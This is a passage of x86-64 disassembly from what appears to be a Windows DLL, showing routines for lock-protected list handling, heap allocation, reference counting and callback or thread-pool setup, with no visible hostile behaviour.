   1800016f9:	48 8b 05 e8 08 04 00 	mov    0x408e8(%rip),%rax        # 0x180041fe8
   180001700:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   180001704:	48 89 08             	mov    %rcx,(%rax)
   180001707:	48 8d 0d 92 06 04 00 	lea    0x40692(%rip),%rcx        # 0x180041da0
   18000170e:	48 8b 05 bb 08 04 00 	mov    0x408bb(%rip),%rax        # 0x180041fd0
   180001715:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   180001719:	48 89 50 08          	mov    %rdx,0x8(%rax)
   18000171d:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   180001721:	48 8b 05 b0 08 04 00 	mov    0x408b0(%rip),%rax        # 0x180041fd8
   180001728:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   18000172c:	48 89 10             	mov    %rdx,(%rax)
   18000172f:	48 8d 05 aa 08 04 00 	lea    0x408aa(%rip),%rax        # 0x180041fe0
   180001736:	48 89 05 ab 08 04 00 	mov    %rax,0x408ab(%rip)        # 0x180041fe8
   18000173d:	48 89 05 9c 08 04 00 	mov    %rax,0x4089c(%rip)        # 0x180041fe0
   180001744:	48 8d 05 85 08 04 00 	lea    0x40885(%rip),%rax        # 0x180041fd0
   18000174b:	48 89 05 86 08 04 00 	mov    %rax,0x40886(%rip)        # 0x180041fd8
   180001752:	48 89 05 77 08 04 00 	mov    %rax,0x40877(%rip)        # 0x180041fd0
   180001759:	48 ff 15 c8 96 03 00 	rex.W call *0x396c8(%rip)        # 0x18003ae28
   180001760:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001765:	eb 3f                	jmp    0x1800017a6
   180001767:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   18000176b:	48 39 48 08          	cmp    %rcx,0x8(%rax)
   18000176f:	0f 85 90 00 00 00    	jne    0x180001805
   180001775:	48 8b 08             	mov    (%rax),%rcx
   180001778:	48 39 41 08          	cmp    %rax,0x8(%rcx)
   18000177c:	0f 85 83 00 00 00    	jne    0x180001805
   180001782:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   180001786:	48 89 4d e0          	mov    %rcx,-0x20(%rbp)
   18000178a:	48 89 51 08          	mov    %rdx,0x8(%rcx)
   18000178e:	4c 8b c0             	mov    %rax,%r8
   180001791:	48 8b 0d c8 f0 03 00 	mov    0x3f0c8(%rip),%rcx        # 0x180040860
   180001798:	33 d2                	xor    %edx,%edx
   18000179a:	48 ff 15 ff 91 03 00 	rex.W call *0x391ff(%rip)        # 0x18003a9a0
   1800017a1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800017a6:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   1800017aa:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1800017ae:	48 3b c1             	cmp    %rcx,%rax
   1800017b1:	75 b4                	jne    0x180001767
   1800017b3:	eb 37                	jmp    0x1800017ec
   1800017b5:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1800017b9:	48 39 48 08          	cmp    %rcx,0x8(%rax)
   1800017bd:	75 46                	jne    0x180001805
   1800017bf:	48 8b 08             	mov    (%rax),%rcx
   1800017c2:	48 39 41 08          	cmp    %rax,0x8(%rcx)
   1800017c6:	75 3d                	jne    0x180001805
   1800017c8:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   1800017cc:	48 89 4d f0          	mov    %rcx,-0x10(%rbp)
   1800017d0:	48 89 51 08          	mov    %rdx,0x8(%rcx)
   1800017d4:	4c 8b c0             	mov    %rax,%r8
   1800017d7:	48 8b 0d 82 f0 03 00 	mov    0x3f082(%rip),%rcx        # 0x180040860
   1800017de:	33 d2                	xor    %edx,%edx
   1800017e0:	48 ff 15 b9 91 03 00 	rex.W call *0x391b9(%rip)        # 0x18003a9a0
   1800017e7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800017ec:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1800017f0:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1800017f4:	48 3b c1             	cmp    %rcx,%rax
   1800017f7:	75 bc                	jne    0x1800017b5
   1800017f9:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1800017fe:	48 83 c4 40          	add    $0x40,%rsp
   180001802:	5d                   	pop    %rbp
   180001803:	c3                   	ret
   180001804:	cc                   	int3
   180001805:	b9 03 00 00 00       	mov    $0x3,%ecx
   18000180a:	cd 29                	int    $0x29
   18000180c:	cc                   	int3
   18000180d:	cc                   	int3
   18000180e:	cc                   	int3
   18000180f:	cc                   	int3
   180001810:	cc                   	int3
   180001811:	cc                   	int3
   180001812:	cc                   	int3
   180001813:	cc                   	int3
   180001814:	cc                   	int3
   180001815:	cc                   	int3
   180001816:	cc                   	int3
   180001817:	cc                   	int3
   180001818:	cc                   	int3
   180001819:	cc                   	int3
   18000181a:	cc                   	int3
   18000181b:	cc                   	int3
   18000181c:	cc                   	int3
   18000181d:	cc                   	int3
   18000181e:	cc                   	int3
   18000181f:	cc                   	int3
   180001820:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001825:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000182a:	57                   	push   %rdi
   18000182b:	48 83 ec 20          	sub    $0x20,%rsp
   18000182f:	48 8d 0d 6a 05 04 00 	lea    0x4056a(%rip),%rcx        # 0x180041da0
   180001836:	49 8b f8             	mov    %r8,%rdi
   180001839:	48 8b f2             	mov    %rdx,%rsi
   18000183c:	bb 01 00 00 00       	mov    $0x1,%ebx
   180001841:	48 ff 15 00 96 03 00 	rex.W call *0x39600(%rip)        # 0x18003ae48
   180001848:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000184d:	83 3d 64 07 04 00 00 	cmpl   $0x0,0x40764(%rip)        # 0x180041fb8
   180001854:	75 09                	jne    0x18000185f
   180001856:	83 3d 5f 07 04 00 00 	cmpl   $0x0,0x4075f(%rip)        # 0x180041fbc
   18000185d:	74 10                	je     0x18000186f
   18000185f:	48 89 35 5a 07 04 00 	mov    %rsi,0x4075a(%rip)        # 0x180041fc0
   180001866:	33 db                	xor    %ebx,%ebx
   180001868:	48 89 3d 59 07 04 00 	mov    %rdi,0x40759(%rip)        # 0x180041fc8
   18000186f:	48 8d 0d 2a 05 04 00 	lea    0x4052a(%rip),%rcx        # 0x180041da0
   180001876:	48 ff 15 ab 95 03 00 	rex.W call *0x395ab(%rip)        # 0x18003ae28
   18000187d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001882:	83 fb 01             	cmp    $0x1,%ebx
   180001885:	75 0c                	jne    0x180001893
   180001887:	48 8b cf             	mov    %rdi,%rcx
   18000188a:	48 8b c6             	mov    %rsi,%rax
   18000188d:	ff 15 05 96 03 00    	call   *0x39605(%rip)        # 0x18003ae98
   180001893:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001898:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000189d:	48 83 c4 20          	add    $0x20,%rsp
   1800018a1:	5f                   	pop    %rdi
   1800018a2:	c3                   	ret
   1800018a3:	cc                   	int3
   1800018a4:	cc                   	int3
   1800018a5:	cc                   	int3
   1800018a6:	cc                   	int3
   1800018a7:	cc                   	int3
   1800018a8:	cc                   	int3
   1800018a9:	cc                   	int3
   1800018aa:	cc                   	int3
   1800018ab:	cc                   	int3
   1800018ac:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1800018b1:	55                   	push   %rbp
   1800018b2:	48 8b ec             	mov    %rsp,%rbp
   1800018b5:	48 83 ec 30          	sub    $0x30,%rsp
   1800018b9:	48 83 65 18 00       	andq   $0x0,0x18(%rbp)
   1800018be:	48 83 65 10 00       	andq   $0x0,0x10(%rbp)
   1800018c3:	48 83 65 20 00       	andq   $0x0,0x20(%rbp)
   1800018c8:	48 83 3d d0 06 04 00 	cmpq   $0x0,0x406d0(%rip)        # 0x180041fa0
   1800018cf:	00 
   1800018d0:	74 07                	je     0x1800018d9
   1800018d2:	33 c0                	xor    %eax,%eax
   1800018d4:	e9 fd 00 00 00       	jmp    0x1800019d6
   1800018d9:	48 8b 0d c8 05 04 00 	mov    0x405c8(%rip),%rcx        # 0x180041ea8
   1800018e0:	4c 8d 05 39 ff ff ff 	lea    -0xc7(%rip),%r8        # 0x180001820
   1800018e7:	48 8d 15 32 ff ff ff 	lea    -0xce(%rip),%rdx        # 0x180001820
   1800018ee:	e8 fd e9 00 00       	call   0x1800102f0
   1800018f3:	8b d8                	mov    %eax,%ebx
   1800018f5:	85 c0                	test   %eax,%eax
   1800018f7:	0f 85 85 00 00 00    	jne    0x180001982
   1800018fd:	48 8d 45 10          	lea    0x10(%rbp),%rax
   180001901:	33 c9                	xor    %ecx,%ecx
   180001903:	45 33 c9             	xor    %r9d,%r9d
   180001906:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000190b:	45 33 c0             	xor    %r8d,%r8d
   18000190e:	48 8d 15 3b f9 ff ff 	lea    -0x6c5(%rip),%rdx        # 0x180001250
   180001915:	48 ff 15 f4 36 04 00 	rex.W call *0x436f4(%rip)        # 0x180045010
   18000191c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001921:	8b d8                	mov    %eax,%ebx
   180001923:	85 c0                	test   %eax,%eax
   180001925:	75 5b                	jne    0x180001982
   180001927:	48 8d 45 18          	lea    0x18(%rbp),%rax
   18000192b:	33 c9                	xor    %ecx,%ecx
   18000192d:	45 33 c9             	xor    %r9d,%r9d
   180001930:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180001935:	45 33 c0             	xor    %r8d,%r8d
   180001938:	48 8d 15 a1 fa ff ff 	lea    -0x55f(%rip),%rdx        # 0x1800013e0
   18000193f:	48 ff 15 d2 36 04 00 	rex.W call *0x436d2(%rip)        # 0x180045018
   180001946:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000194b:	8b d8                	mov    %eax,%ebx
   18000194d:	85 c0                	test   %eax,%eax
   18000194f:	75 31                	jne    0x180001982
   180001951:	48 8b 15 00 ef 03 00 	mov    0x3ef00(%rip),%rdx        # 0x180040858
   180001958:	4c 8d 45 20          	lea    0x20(%rbp),%r8
   18000195c:	8d 48 04             	lea    0x4(%rax),%ecx
   18000195f:	48 ff 15 ca 90 03 00 	rex.W call *0x390ca(%rip)        # 0x18003aa30
   180001966:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000196b:	85 c0                	test   %eax,%eax
   18000196d:	75 73                	jne    0x1800019e2
   18000196f:	48 ff 15 da 8f 03 00 	rex.W call *0x38fda(%rip)        # 0x18003a950
   180001976:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000197b:	48 83 65 20 00       	andq   $0x0,0x20(%rbp)
   180001980:	8b d8                	mov    %eax,%ebx
   180001982:	48 8b 0d 1f 05 04 00 	mov    0x4051f(%rip),%rcx        # 0x180041ea8
   180001989:	48 8d 15 90 fe ff ff 	lea    -0x170(%rip),%rdx        # 0x180001820
   180001990:	e8 47 ea 00 00       	call   0x1800103dc
   180001995:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   180001999:	48 85 c9             	test   %rcx,%rcx
   18000199c:	74 0c                	je     0x1800019aa
   18000199e:	48 ff 15 5b 36 04 00 	rex.W call *0x4365b(%rip)        # 0x180045000
   1800019a5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800019aa:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
   1800019ae:	48 85 c9             	test   %rcx,%rcx
   1800019b1:	74 0c                	je     0x1800019bf
   1800019b3:	48 ff 15 46 36 04 00 	rex.W call *0x43646(%rip)        # 0x180045000
   1800019ba:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800019bf:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   1800019c3:	48 85 c9             	test   %rcx,%rcx
   1800019c6:	74 0c                	je     0x1800019d4
   1800019c8:	48 ff 15 69 90 03 00 	rex.W call *0x39069(%rip)        # 0x18003aa38
   1800019cf:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800019d4:	8b c3                	mov    %ebx,%eax
   1800019d6:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   1800019db:	48 83 c4 30          	add    $0x30,%rsp
   1800019df:	5d                   	pop    %rbp
   1800019e0:	c3                   	ret
   1800019e1:	cc                   	int3
   1800019e2:	45 33 c0             	xor    %r8d,%r8d
   1800019e5:	48 8d 0d 94 fb ff ff 	lea    -0x46c(%rip),%rcx        # 0x180001580
   1800019ec:	33 d2                	xor    %edx,%edx
   1800019ee:	e8 a9 d4 00 00       	call   0x18000ee9c
   1800019f3:	48 89 05 a6 05 04 00 	mov    %rax,0x405a6(%rip)        # 0x180041fa0
   1800019fa:	48 85 c0             	test   %rax,%rax
   1800019fd:	75 13                	jne    0x180001a12
   1800019ff:	48 ff 15 4a 8f 03 00 	rex.W call *0x38f4a(%rip)        # 0x18003a950
   180001a06:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001a0b:	8b d8                	mov    %eax,%ebx
   180001a0d:	e9 70 ff ff ff       	jmp    0x180001982
   180001a12:	48 8b 45 10          	mov    0x10(%rbp),%rax
   180001a16:	48 89 05 8b 05 04 00 	mov    %rax,0x4058b(%rip)        # 0x180041fa8
   180001a1d:	48 8b 45 18          	mov    0x18(%rbp),%rax
   180001a21:	48 89 05 88 05 04 00 	mov    %rax,0x40588(%rip)        # 0x180041fb0
   180001a28:	eb aa                	jmp    0x1800019d4
   180001a2a:	cc                   	int3
   180001a2b:	cc                   	int3
   180001a2c:	cc                   	int3
   180001a2d:	cc                   	int3
   180001a2e:	cc                   	int3
   180001a2f:	cc                   	int3
   180001a30:	40 53                	rex push %rbx
   180001a32:	48 83 ec 20          	sub    $0x20,%rsp
   180001a36:	48 8b 51 38          	mov    0x38(%rcx),%rdx
   180001a3a:	48 8b d9             	mov    %rcx,%rbx
   180001a3d:	48 8b 49 28          	mov    0x28(%rcx),%rcx
   180001a41:	48 8b 43 30          	mov    0x30(%rbx),%rax
   180001a45:	ff 15 4d 94 03 00    	call   *0x3944d(%rip)        # 0x18003ae98
   180001a4b:	48 8b 53 28          	mov    0x28(%rbx),%rdx
   180001a4f:	83 c8 ff             	or     $0xffffffff,%eax
   180001a52:	f0 0f c1 42 08       	lock xadd %eax,0x8(%rdx)
   180001a57:	83 f8 01             	cmp    $0x1,%eax
   180001a5a:	75 0c                	jne    0x180001a68
   180001a5c:	48 8b 02             	mov    (%rdx),%rax
   180001a5f:	48 8b ca             	mov    %rdx,%rcx
   180001a62:	ff 15 30 94 03 00    	call   *0x39430(%rip)        # 0x18003ae98
   180001a68:	48 8b 0d f1 ed 03 00 	mov    0x3edf1(%rip),%rcx        # 0x180040860
   180001a6f:	4c 8b c3             	mov    %rbx,%r8
   180001a72:	33 d2                	xor    %edx,%edx
   180001a74:	48 83 c4 20          	add    $0x20,%rsp
   180001a78:	5b                   	pop    %rbx
   180001a79:	48 ff 25 20 8f 03 00 	rex.W jmp *0x38f20(%rip)        # 0x18003a9a0
   180001a80:	cc                   	int3
   180001a81:	cc                   	int3
   180001a82:	cc                   	int3
   180001a83:	cc                   	int3
   180001a84:	cc                   	int3
   180001a85:	cc                   	int3
   180001a86:	cc                   	int3
   180001a87:	cc                   	int3
   180001a88:	cc                   	int3
   180001a89:	cc                   	int3
   180001a8a:	cc                   	int3
   180001a8b:	cc                   	int3
   180001a8c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001a91:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180001a96:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180001a9b:	57                   	push   %rdi
   180001a9c:	48 83 ec 20          	sub    $0x20,%rsp
   180001aa0:	48 8b 0d b9 ed 03 00 	mov    0x3edb9(%rip),%rcx        # 0x180040860
   180001aa7:	48 8b da             	mov    %rdx,%rbx
   180001aaa:	48 8b 2d f7 03 04 00 	mov    0x403f7(%rip),%rbp        # 0x180041ea8
   180001ab1:	33 d2                	xor    %edx,%edx
   180001ab3:	49 8b f0             	mov    %r8,%rsi
   180001ab6:	49 8b f9             	mov    %r9,%rdi
   180001ab9:	44 8d 42 40          	lea    0x40(%rdx),%r8d
   180001abd:	48 ff 15 e4 8e 03 00 	rex.W call *0x38ee4(%rip)        # 0x18003a9a8
   180001ac4:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001ac9:	48 8b c8             	mov    %rax,%rcx
   180001acc:	48 85 c0             	test   %rax,%rax
   180001acf:	75 05                	jne    0x180001ad6
   180001ad1:	8d 41 0e             	lea    0xe(%rcx),%eax
   180001ad4:	eb 2e                	jmp    0x180001b04
   180001ad6:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001ad9:	0f 29 00             	movaps %xmm0,(%rax)
   180001adc:	0f 29 40 10          	movaps %xmm0,0x10(%rax)
   180001ae0:	48 89 68 20          	mov    %rbp,0x20(%rax)
   180001ae4:	48 89 58 28          	mov    %rbx,0x28(%rax)
   180001ae8:	48 89 70 30          	mov    %rsi,0x30(%rax)
   180001aec:	48 89 78 38          	mov    %rdi,0x38(%rax)
   180001af0:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   180001af5:	48 89 08             	mov    %rcx,(%rax)
   180001af8:	b8 01 00 00 00       	mov    $0x1,%eax
   180001afd:	f0 0f c1 43 08       	lock xadd %eax,0x8(%rbx)
   180001b02:	33 c0                	xor    %eax,%eax
   180001b04:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001b09:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180001b0e:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180001b13:	48 83 c4 20          	add    $0x20,%rsp
   180001b17:	5f                   	pop    %rdi
   180001b18:	c3                   	ret
   180001b19:	cc                   	int3
   180001b1a:	cc                   	int3
   180001b1b:	cc                   	int3
   180001b1c:	cc                   	int3
   180001b1d:	cc                   	int3
   180001b1e:	cc                   	int3
   180001b1f:	cc                   	int3
   180001b20:	40 53                	rex push %rbx
   180001b22:	48 83 ec 20          	sub    $0x20,%rsp
   180001b26:	48 8b 51 28          	mov    0x28(%rcx),%rdx
   180001b2a:	48 8b d9             	mov    %rcx,%rbx
   180001b2d:	83 c8 ff             	or     $0xffffffff,%eax
   180001b30:	f0 0f c1 42 08       	lock xadd %eax,0x8(%rdx)
   180001b35:	83 f8 01             	cmp    $0x1,%eax
   180001b38:	75 0c                	jne    0x180001b46
   180001b3a:	48 8b 02             	mov    (%rdx),%rax
   180001b3d:	48 8b ca             	mov    %rdx,%rcx
   180001b40:	ff 15 52 93 03 00    	call   *0x39352(%rip)        # 0x18003ae98
   180001b46:	48 8b 0d 13 ed 03 00 	mov    0x3ed13(%rip),%rcx        # 0x180040860
   180001b4d:	4c 8b c3             	mov    %rbx,%r8
   180001b50:	33 d2                	xor    %edx,%edx
   180001b52:	48 83 c4 20          	add    $0x20,%rsp
   180001b56:	5b                   	pop    %rbx
   180001b57:	48 ff 25 42 8e 03 00 	rex.W jmp *0x38e42(%rip)        # 0x18003a9a0
   180001b5e:	cc                   	int3
   180001b5f:	cc                   	int3
   180001b60:	cc                   	int3
   180001b61:	cc                   	int3
   180001b62:	cc                   	int3
   180001b63:	cc                   	int3
   180001b64:	cc                   	int3
   180001b65:	cc                   	int3
   180001b66:	cc                   	int3
   180001b67:	cc                   	int3
   180001b68:	cc                   	int3
   180001b69:	cc                   	int3
   180001b6a:	cc                   	int3
   180001b6b:	cc                   	int3
   180001b6c:	48 8b c4             	mov    %rsp,%rax
   180001b6f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180001b73:	48 89 68 10          	mov    %rbp,0x10(%rax)
   180001b77:	48 89 70 18          	mov    %rsi,0x18(%rax)
   180001b7b:	48 89 78 20          	mov    %rdi,0x20(%rax)
   180001b7f:	41 56                	push   %r14
   180001b81:	48 83 ec 20          	sub    $0x20,%rsp
   180001b85:	83 79 10 00          	cmpl   $0x0,0x10(%rcx)
   180001b89:	41 8b f1             	mov    %r9d,%esi
   180001b8c:	49 8b e8             	mov    %r8,%rbp
   180001b8f:	4c 8b f2             	mov    %rdx,%r14
   180001b92:	48 8b f9             	mov    %rcx,%rdi
   180001b95:	74 11                	je     0x180001ba8
   180001b97:	41 8b c1             	mov    %r9d,%eax
   180001b9a:	0d 00 00 00 c0       	or     $0xc0000000,%eax
   180001b9f:	85 41 14             	test   %eax,0x14(%rcx)
   180001ba2:	0f 85 93 00 00 00    	jne    0x180001c3b
   180001ba8:	48 8b 0d b1 ec 03 00 	mov    0x3ecb1(%rip),%rcx        # 0x180040860
   180001baf:	ba 08 00 00 00       	mov    $0x8,%edx
   180001bb4:	44 8d 42 38          	lea    0x38(%rdx),%r8d
   180001bb8:	48 ff 15 e9 8d 03 00 	rex.W call *0x38de9(%rip)        # 0x18003a9a8
   180001bbf:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001bc4:	48 8b d8             	mov    %rax,%rbx
   180001bc7:	48 85 c0             	test   %rax,%rax
   180001bca:	74 6f                	je     0x180001c3b
   180001bcc:	48 83 60 28 00       	andq   $0x0,0x28(%rax)
   180001bd1:	b9 01 00 00 00       	mov    $0x1,%ecx
   180001bd6:	4c 89 70 10          	mov    %r14,0x10(%rax)
   180001bda:	48 89 68 18          	mov    %rbp,0x18(%rax)
   180001bde:	89 70 20             	mov    %esi,0x20(%rax)
   180001be1:	48 89 78 38          	mov    %rdi,0x38(%rax)
   180001be5:	f0 0f c1 4f 08       	lock xadd %ecx,0x8(%rdi)
   180001bea:	48 8d 0d af 01 04 00 	lea    0x401af(%rip),%rcx        # 0x180041da0
   180001bf1:	48 ff 15 50 92 03 00 	rex.W call *0x39250(%rip)        # 0x18003ae48
   180001bf8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001bfd:	48 8b 05 44 03 04 00 	mov    0x40344(%rip),%rax        # 0x180041f48
   180001c04:	48 8d 0d 35 03 04 00 	lea    0x40335(%rip),%rcx        # 0x180041f40
   180001c0b:	48 39 08             	cmp    %rcx,(%rax)
   180001c0e:	74 07                	je     0x180001c17
   180001c10:	b9 03 00 00 00       	mov    $0x3,%ecx
   180001c15:	cd 29                	int    $0x29
   180001c17:	48 89 0b             	mov    %rcx,(%rbx)
   180001c1a:	48 8d 0d 7f 01 04 00 	lea    0x4017f(%rip),%rcx        # 0x180041da0
   180001c21:	48 89 43 08          	mov    %rax,0x8(%rbx)
   180001c25:	48 89 18             	mov    %rbx,(%rax)
   180001c28:	48 89 1d 19 03 04 00 	mov    %rbx,0x40319(%rip)        # 0x180041f48
   180001c2f:	48 ff 15 f2 91 03 00 	rex.W call *0x391f2(%rip)        # 0x18003ae28
   180001c36:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001c3b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001c40:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180001c45:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180001c4a:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   180001c4f:	48 83 c4 20          	add    $0x20,%rsp
   180001c53:	41 5e                	pop    %r14
   180001c55:	c3                   	ret
   180001c56:	cc                   	int3
   180001c57:	cc                   	int3
   180001c58:	cc                   	int3
   180001c59:	cc                   	int3
   180001c5a:	cc                   	int3
   180001c5b:	cc                   	int3
   180001c5c:	cc                   	int3
   180001c5d:	cc                   	int3
   180001c5e:	cc                   	int3
   180001c5f:	cc                   	int3
   180001c60:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   180001c65:	56                   	push   %rsi
   180001c66:	57                   	push   %rdi
   180001c67:	41 56                	push   %r14
   180001c69:	48 83 ec 20          	sub    $0x20,%rsp
   180001c6d:	8b 0d 6d 01 04 00    	mov    0x4016d(%rip),%ecx        # 0x180041de0
   180001c73:	48 ff 15 56 8e 03 00 	rex.W call *0x38e56(%rip)        # 0x18003aad0
   180001c7a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001c7f:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   180001c84:	48 8b d8             	mov    %rax,%rbx
   180001c87:	48 85 c0             	test   %rax,%rax
   180001c8a:	75 17                	jne    0x180001ca3
   180001c8c:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   180001c91:	e8 56 d1 00 00       	call   0x18000edec
   180001c96:	85 c0                	test   %eax,%eax
   180001c98:	0f 85 45 01 00 00    	jne    0x180001de3
   180001c9e:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   180001ca3:	83 7b 1c 00          	cmpl   $0x0,0x1c(%rbx)
   180001ca7:	0f 85 36 01 00 00    	jne    0x180001de3
   180001cad:	48 8d 0d ec 00 04 00 	lea    0x400ec(%rip),%rcx        # 0x180041da0
   180001cb4:	c7 43 1c 01 00 00 00 	movl   $0x1,0x1c(%rbx)
   180001cbb:	48 ff 15 86 91 03 00 	rex.W call *0x39186(%rip)        # 0x18003ae48
   180001cc2:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001cc7:	48 83 3d 81 02 04 00 	cmpq   $0x0,0x40281(%rip)        # 0x180041f50
   180001cce:	00 
   180001ccf:	0f 85 f8 00 00 00    	jne    0x180001dcd
   180001cd5:	4c 8d 35 64 02 04 00 	lea    0x40264(%rip),%r14        # 0x180041f40
   180001cdc:	e9 dc 00 00 00       	jmp    0x180001dbd
   180001ce1:	4c 39 77 08          	cmp    %r14,0x8(%rdi)
   180001ce5:	0f 85 07 01 00 00    	jne    0x180001df2
   180001ceb:	48 8b 07             	mov    (%rdi),%rax
   180001cee:	48 39 78 08          	cmp    %rdi,0x8(%rax)
   180001cf2:	0f 85 fa 00 00 00    	jne    0x180001df2
   180001cf8:	48 89 05 41 02 04 00 	mov    %rax,0x40241(%rip)        # 0x180041f40
   180001cff:	4c 89 70 08          	mov    %r14,0x8(%rax)
   180001d03:	48 89 3d 46 02 04 00 	mov    %rdi,0x40246(%rip)        # 0x180041f50
   180001d0a:	48 ff 15 c7 8d 03 00 	rex.W call *0x38dc7(%rip)        # 0x18003aad8
   180001d11:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001d16:	48 8d 0d 83 00 04 00 	lea    0x40083(%rip),%rcx        # 0x180041da0
   180001d1d:	89 47 30             	mov    %eax,0x30(%rdi)
   180001d20:	48 ff 15 01 91 03 00 	rex.W call *0x39101(%rip)        # 0x18003ae28
   180001d27:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001d2c:	4c 8b 47 28          	mov    0x28(%rdi),%r8
   180001d30:	8b 57 20             	mov    0x20(%rdi),%edx
   180001d33:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   180001d37:	48 8b 47 10          	mov    0x10(%rdi),%rax
   180001d3b:	ff 15 57 91 03 00    	call   *0x39157(%rip)        # 0x18003ae98
   180001d41:	48 8d 0d 58 00 04 00 	lea    0x40058(%rip),%rcx        # 0x180041da0
   180001d48:	48 ff 15 f9 90 03 00 	rex.W call *0x390f9(%rip)        # 0x18003ae48
   180001d4f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001d54:	48 83 25 f4 01 04 00 	andq   $0x0,0x401f4(%rip)        # 0x180041f50
   180001d5b:	00 
   180001d5c:	48 8b 57 38          	mov    0x38(%rdi),%rdx
   180001d60:	83 c8 ff             	or     $0xffffffff,%eax
   180001d63:	f0 0f c1 42 08       	lock xadd %eax,0x8(%rdx)
   180001d68:	83 f8 01             	cmp    $0x1,%eax
   180001d6b:	75 0c                	jne    0x180001d79
   180001d6d:	48 8b 02             	mov    (%rdx),%rax
   180001d70:	48 8b ca             	mov    %rdx,%rcx
   180001d73:	ff 15 1f 91 03 00    	call   *0x3911f(%rip)        # 0x18003ae98
   180001d79:	48 8b 0d e0 ea 03 00 	mov    0x3eae0(%rip),%rcx        # 0x180040860
   180001d80:	4c 8b c7             	mov    %rdi,%r8
   180001d83:	33 d2                	xor    %edx,%edx
   180001d85:	48 ff 15 14 8c 03 00 	rex.W call *0x38c14(%rip)        # 0x18003a9a0
   180001d8c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001d91:	33 f6                	xor    %esi,%esi
   180001d93:	48 8d 3d c6 01 04 00 	lea    0x401c6(%rip),%rdi        # 0x180041f60
   180001d9a:	48 8b 0f             	mov    (%rdi),%rcx
   180001d9d:	48 85 c9             	test   %rcx,%rcx
   180001da0:	74 1b                	je     0x180001dbd
   180001da2:	48 ff 15 e7 8d 03 00 	rex.W call *0x38de7(%rip)        # 0x18003ab90
   180001da9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001dae:	48 83 27 00          	andq   $0x0,(%rdi)
   180001db2:	ff c6                	inc    %esi
   180001db4:	48 83 c7 08          	add    $0x8,%rdi
   180001db8:	83 fe 08             	cmp    $0x8,%esi
   180001dbb:	72 dd                	jb     0x180001d9a
   180001dbd:	48 8b 3d 7c 01 04 00 	mov    0x4017c(%rip),%rdi        # 0x180041f40
   180001dc4:	49 3b fe             	cmp    %r14,%rdi
   180001dc7:	0f 85 14 ff ff ff    	jne    0x180001ce1
   180001dcd:	48 8d 0d cc ff 03 00 	lea    0x3ffcc(%rip),%rcx        # 0x180041da0
   180001dd4:	48 ff 15 4d 90 03 00 	rex.W call *0x3904d(%rip)        # 0x18003ae28
   180001ddb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001de0:	ff 4b 1c             	decl   0x1c(%rbx)
